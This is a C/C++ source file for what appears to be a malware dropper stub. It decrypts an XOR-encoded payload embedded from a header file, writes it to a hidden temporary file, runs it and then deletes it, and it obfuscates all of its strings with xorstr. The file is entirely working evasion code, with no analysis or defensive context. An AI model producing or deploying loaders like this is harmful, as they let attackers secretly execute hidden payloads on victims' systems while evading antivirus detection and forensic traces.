#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include "xorstr.hpp"
#include "payload.h"

int main() {
    unsigned char* buf = (unsigned char*)malloc(code_len);
    if (!buf) {
        auto err = xorstr("Error: memory allocation failed\n");
        printf("%s", err.crypt_get());
        return 1;
    }

    for (size_t i = 0; i < code_len; i++) {
        buf[i] = code_data[i] ^ XOR_KEY;
    }

    auto tmp_path = xorstr("./.tmp_prog");
    const char* path = tmp_path.crypt_get();

    FILE* f = fopen(path, "wb");
    if (!f) {
        auto err = xorstr("Error: cannot create temporary file\n");
        printf("%s", err.crypt_get());
        free(buf);
        return 1;
    }

    fwrite(buf, 1, code_len, f);
    fclose(f);

    chmod(path, 0755);
    system(path);
    unlink(path);

    free(buf);
    return 0;
}